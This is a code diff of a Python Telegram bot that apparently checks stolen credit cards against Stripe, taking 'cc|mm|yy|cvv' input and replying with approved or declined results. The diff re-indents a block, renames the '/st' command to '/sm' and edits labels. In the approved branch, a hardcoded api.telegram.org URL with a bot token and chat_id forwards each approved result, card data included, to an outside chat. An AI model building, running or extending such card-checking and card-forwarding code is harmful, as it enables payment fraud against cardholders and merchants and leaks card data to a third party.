@@ -173,18 +173,18 @@ def snd_welcome ( message ) :
                     rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄:<b>\t' + rps + '</b>❌\n' + '|-𝙂𝘼𝙏:\t' + '<b>Stripe Auth </b>' + '\n'
                     msg = '|-𝘾𝘾 :\t' + xx + rps + shm + tp + lvel + cont + us + date + auther
                     bot.reply_to ( message , msg )
-			if 'insufficient_funds' in rr:
-				us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
-				message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
-				rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄:<b>\t' + rps + '</b>✅\n' + '|-𝙂𝘼𝙏:\t' + '<b>Stripe Auth </b>' + '\n'
-				msg = '|-𝘾𝘾 :\t' + xx + rps + shm + tp + lvel + cont + us + date + auther
-				bot.reply_to ( message , msg )
-			else:
-				us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
-				message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
-				rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄:<b>\t' + rps + '</b>❌\n' + '|-𝙂𝘼𝙏:\t' + '<b>Stripe Auth </b>' + '\n'
-				msg = '|-𝘾𝘾 :\t' + xx + rps + shm + tp + lvel + cont + us + date + auther
-				bot.reply_to ( message , msg )
+                    if 'insufficient_funds' in rr:
+                        us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
+                        message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
+                        rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄:<b>\t' + rps + '</b>✅\n' + '|-𝙂𝘼𝙏:\t' + '<b>Stripe Auth </b>' + '\n'
+                        msg = '|-𝘾𝘾 :\t' + xx + rps + shm + tp + lvel + cont + us + date + auther
+                        bot.reply_to ( message , msg )
+                    else:
+                        us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
+                        message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
+                        rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄:<b>\t' + rps + '</b>❌\n' + '|-𝙂𝘼𝙏:\t' + '<b>Stripe Auth </b>' + '\n'
+                        msg = '|-𝘾𝘾 :\t' + xx + rps + shm + tp + lvel + cont + us + date + auther
+                        bot.reply_to ( message , msg )
 
                 elif 'Request rate limit exceeded.' or 'rate_limit' :
                     bot.reply_to ( message , "CHEAK YOUR PROXY ---/ Retry " )
@@ -332,7 +332,7 @@ def snd_welcome ( message ) :
     dd = message.text.split ( '|' )
     cc22 = dd[0]
     if cc22 != message.text :
-        cc1 = ccu.split ( '/st ' )[1]
+        cc1 = ccu.split ( '/sm ' )[1]
         res = "^[0-9]+[|]+[0-9]+[|]+[0-9]+[|]+[0-9]"
         tt = re.match ( res , cc1 )
         if tt == None :
@@ -400,14 +400,14 @@ def snd_welcome ( message ) :
                         us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' +'@'+ str (
                         message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
                         rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ᴍꜱɢ: <b>' + msge + '</b>❌\n'
-                        rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' + '|-𝙂𝙀𝙏:\t' + '<b>Strip 1$</b>' + '\n'
+                        rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' + '|-𝙂𝘼𝙏:\t' + '<b>Strip 1$</b>' + '\n'
                         msg= '|- 𝘾𝘾: ' + xx + rps + rp + shm + tp + lvel + cont + us + date + auther
                         bot.reply_to ( message , msg )               
                 else :
                     us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' +'@'+str (
                         message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
                     rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ᴍꜱɢ: <b>' + msge + '</b>✅\n'
-                    rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' + '|-𝙂𝙀𝙏:\t' + '<b>Strip 1$</b>' + '\n'
+                    rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' + '|-𝙂𝘼𝙏:\t' + '<b>Strip 1$</b>' + '\n'
                     msg= '|- 𝘾𝘾: ' + xx + rps + rp + shm + tp + lvel + cont + us + date + auther
                     bot.reply_to ( message , msg )
                     snd = 'https://api.telegram.org/bot5086659494:AAEeU6aSjOU3vLCavHDENBp78p2fTmrO8e8/sendMessage?chat_id=1935904246&text=' + msg
@@ -420,3 +420,4 @@ def snd_welcome ( message ) :
 𝙥𝙡𝙚𝙖𝙨𝙚 𝙢𝙖𝙠𝙚 𝙩𝙝𝙞𝙨 𝙨𝙮𝙣𝙩𝙖𝙭 
 /sm  ｃｃ|ｍｍ|ｙｙ|ｃｖｖ ''' )
 bot.infinity_polling ()
+
